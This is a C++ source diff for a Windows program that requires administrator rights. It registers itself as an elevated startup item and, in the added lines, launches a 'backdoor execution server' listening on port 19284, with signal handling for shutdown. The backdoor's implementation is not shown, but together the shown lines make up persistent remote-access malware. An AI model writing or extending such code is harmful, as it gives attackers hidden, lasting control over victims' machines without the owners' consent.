@@ -2,17 +2,33 @@
 #include <AdminCheck.hpp>
 #include <PathToCurrentExecutable.hpp>
 #include <AdminStartupItem.hpp>
+#include <CombaseLibrary.hpp>
+#include <BackdoorExecution.hpp>
+
 #include <iostream>
 #include <ios>
 #include <iomanip>
-#include <CombaseLibrary.hpp>
 
 #include <stdexcept>
+#include <exception>
 #include <sstream>
 #include <type_traits>
 
+#include <csignal>
+
+static volatile std::sig_atomic_t g_program_is_stopping = false;
+
+static void SignalHandler(int signal)
+{
+    g_program_is_stopping = true;
+}
+
 int main()
 {
+    // HANDLE CTRL+C and CTRL+Break (and kill in Linux)
+    std::signal(SIGINT, SignalHandler);
+    std::signal(SIGTERM, SignalHandler);
+
     try
     {
         if (!AdminCheck{}.IsAdmin())
@@ -23,22 +39,19 @@ int main()
 
         CombaseLibrary combase_library{};
 
-        // Create a Scheduled Task to trigger at startup.
-        // In the Create Task dialog, select the following:
-        // 1. General (tab), Run with highest privileges
-        // 2. Triggers (tab), At startup
-        // Make the action run the current executable of this program.
-        // Use Win32API to do this programmatically.
-
         // Get the path to the current executable.
         const std::wstring path_to_current_executable = PathToCurrentExecutable{}.GetPath();
         std::wcout << "Path to current executable: " << path_to_current_executable << std::endl;
+
         AdminStartupItem{}.Create(path_to_current_executable);
         std::cout << "Created startup item successfully" << std::endl;
+
+        // Start the backdoor execution server
+        BackdoorExecution{}.Serve(g_program_is_stopping, 19284 /*Seems like a good number, why not?*/);
     }
     catch (std::exception& e)
     {
-        std::cerr << "Exception: " << e.what() << std::endl;
+        std::cerr << "Exception in main: " << e.what() << std::endl;
     }
     return 0;
 }
